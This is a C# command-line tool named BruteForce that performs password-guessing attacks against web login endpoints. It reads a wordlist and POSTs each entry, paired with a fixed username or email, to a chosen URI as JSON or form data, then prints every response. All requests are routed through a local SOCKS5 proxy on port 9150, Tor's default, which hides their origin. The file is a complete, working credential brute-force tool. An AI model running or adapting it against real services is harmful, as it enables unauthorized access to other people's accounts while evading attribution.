using CommandLine;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Http;
using System.Text;
using MihaZupan;

namespace BruteForce
{
    //Example: ./BruteForce.exe attack -f "C:\\Users\\Laura\\Desktop\\prueba.txt" -p "email:prueba@hotmail.com" -k "password" -u "http://localhost:8080/api/auth/signin" --json true
    [Verb("attack", HelpText = "Brute force attack.")]
    class Options
    {
        [Option('u', Required = true, HelpText = "Uri")]
        public string uri { get; set; }
        
        [Option('p', Required = true, HelpText = "Param name and value separated by a colon. Example: username:cristina")]
        public string param { get; set; }

        [Option('k', Required = true, HelpText = "Name of param to brute force")]
        public string key { get; set; }
        
        [Option("json", Default = false, HelpText = "Are param values in a JSON?")]
        public bool isJson { get; set; }

        [Option('f', Required = true)]
        public string file { get; set; }

        public static int Attack(Options opts)
        {
            try
            {
                string[] pv = opts.param.Split(":");
                string param = pv[0];
                string value = pv[1];

                if (System.IO.File.Exists(opts.file))
                {
                    string[] lines = System.IO.File.ReadAllLines(opts.file);
                    foreach (var line in lines)
                    {
                        if (opts.isJson)
                        {
                            var json = "{ \"" + param + "\" : \"" + value + "\",  " +
                            " \"" + opts.key + "\" : \"" + line + "\"}";
                            var content = new StringContent(json, Encoding.UTF8, "application/json");
                            Console.WriteLine(json);
                            HttpClient client = new HttpClient(handler: ClientHandler(), disposeHandler: true);
                            
                            var r = client.PostAsync(opts.uri, content).Result;
                            var c = r.Content.ReadAsStringAsync().Result;
                            Console.WriteLine(r);
                            Console.WriteLine(c);
                        }
                        else
                        {
                            var content = new FormUrlEncodedContent(new[]
                            {
                                new KeyValuePair<string, string>(param, value),
                                new KeyValuePair<string, string>(opts.key, line),
                            });
                            Console.WriteLine(param + " = " + value + ", " + opts.key + " = " + line);
                            HttpClient client = new HttpClient(handler: ClientHandler(), disposeHandler: true);
                            var r = client.PostAsync(opts.uri, content).Result;
                            var c = r.Content.ReadAsStringAsync().Result;
                            Console.WriteLine(r);
                            Console.WriteLine(c);
                        }
                    }
                }
            }
            catch(Exception e)
            {
                Console.WriteLine(e.Message);
                return 1;
            }
            return 0;
        }

        public static HttpClientHandler ClientHandler()
        {
            var proxy = new HttpToSocks5Proxy("127.0.0.1", 9150);
            var handler = new HttpClientHandler { Proxy = proxy };
            return handler;
        }
    }
}
